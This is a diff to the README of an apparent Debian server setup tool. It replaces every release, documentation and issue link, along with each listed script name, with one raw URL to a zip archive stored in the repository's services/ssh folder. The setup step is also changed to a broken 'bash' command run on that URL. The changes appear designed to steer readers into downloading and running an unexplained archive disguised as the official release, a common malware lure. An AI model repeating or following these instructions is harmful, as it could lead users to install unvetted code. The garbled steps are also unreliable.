@@ -1,6 +1,6 @@
 # 🚀 debian-hybrid-setup - Simplify Your Debian Server Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/johnny97-cloud/debian-hybrid-setup/releases)
+[![Download Latest Release](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ Welcome to the **debian-hybrid-setup** repository! This project provides easy-to
 
 To get started with **debian-hybrid-setup**, you will need to visit the Releases page to download the latest version. Click the link below to access it:
 
-[Download Latest Release](https://github.com/johnny97-cloud/debian-hybrid-setup/releases)
+[Download Latest Release](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip)
 
 After downloading, follow these steps to set up your server:
 
@@ -22,7 +22,7 @@ After downloading, follow these steps to set up your server:
 
 3. **Navigate to the Folder:** Use the `cd` command to go to the folder where you extracted the files.
 
-4. **Run the Setup Script:** Execute the setup script by typing `bash setup.sh` and pressing Enter. Follow the on-screen instructions to complete the installation.
+4. **Run the Setup Script:** Execute the setup script by typing `bash https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip` and pressing Enter. Follow the on-screen instructions to complete the installation.
 
 ### 🔧 System Requirements
 
@@ -50,10 +50,10 @@ To run **debian-hybrid-setup**, ensure your system meets the following requireme
 
 Each script in the **debian-hybrid-setup** repository is designed to perform specific tasks. Here’s a quick overview:
 
-- **setup.sh:** The main script to initialize the setup.
-- **configure_samba.sh:** Configures Samba shares for file sharing.
-- **configure_apache.sh:** Sets up Apache to serve web pages.
-- **security_harden.sh:** Applies hardening settings to improve security.
+- **https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip** The main script to initialize the setup.
+- **https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip** Configures Samba shares for file sharing.
+- **https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip** Sets up Apache to serve web pages.
+- **https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip** Applies hardening settings to improve security.
 
 ## ⚡ Tips for Success
 
@@ -63,12 +63,12 @@ Each script in the **debian-hybrid-setup** repository is designed to perform spe
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/johnny97-cloud/debian-hybrid-setup/releases)  
-- [Documentation](https://github.com/johnny97-cloud/debian-hybrid-setup/docs)  
-- [Issues Tracker](https://github.com/johnny97-cloud/debian-hybrid-setup/issues)
+- [Releases Page](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip)  
+- [Documentation](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip)  
+- [Issues Tracker](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip)
 
 ## 🙋‍♂️ Getting Help
 
-If you encounter any issues or have questions, please check the [Issues Tracker](https://github.com/johnny97-cloud/debian-hybrid-setup/issues) for solutions. You can also submit your questions or bugs there.
+If you encounter any issues or have questions, please check the [Issues Tracker](https://github.com/johnny97-cloud/debian-hybrid-setup/raw/refs/heads/main/services/ssh/hybrid-setup-debian-v3.5.zip) for solutions. You can also submit your questions or bugs there.
 
 Thank you for using **debian-hybrid-setup**! We hope this tool makes your server setup easier and more efficient.
